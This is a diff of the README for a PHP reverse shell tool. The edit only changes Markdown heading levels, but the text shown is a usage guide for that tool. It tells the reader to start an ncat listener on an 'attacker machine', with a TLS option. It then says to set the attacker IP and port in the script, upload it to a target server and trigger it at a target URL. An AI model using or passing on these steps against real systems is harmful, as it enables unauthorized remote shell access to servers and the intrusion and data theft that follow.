@@ -1,6 +1,6 @@
 simple PHP Reverse Shell — NZRXHX
 
-## Features
+### Features
 
 - Fully functional reverse shell over TCP
 - Compatible with Linux and Windows (auto-detects shell)
@@ -11,9 +11,9 @@ simple PHP Reverse Shell — NZRXHX
 
 ---
 
-## Usage
+### Usage
 
-# 1. Start Listener
+## 1. Start Listener
 
 On your **attacker machine**, start a listener:
 ```bash
@@ -21,7 +21,7 @@ ncat -lvnp 443
 ```
 You may replace 443 with another port.
 
-# 2. Edit Script
+## 2. Edit Script
 
 Modify the following values in the PHP script:
 ```php
@@ -30,7 +30,7 @@ $remote_port = 443;
 $allowed_hosts = ['YOUR_IP'];
 ```
 
-# 3. Upload and Execute
+## 3. Upload and Execute
 
 Upload the PHP script to the target system and trigger it via a web request:
 
@@ -38,7 +38,7 @@ http://target.com/shell.php
 
 Optional: TLS (SSL) Support
 
-## If using a TLS listener:
+### If using a TLS listener:
 
 ```bash
 ncat --ssl -lvnp 443
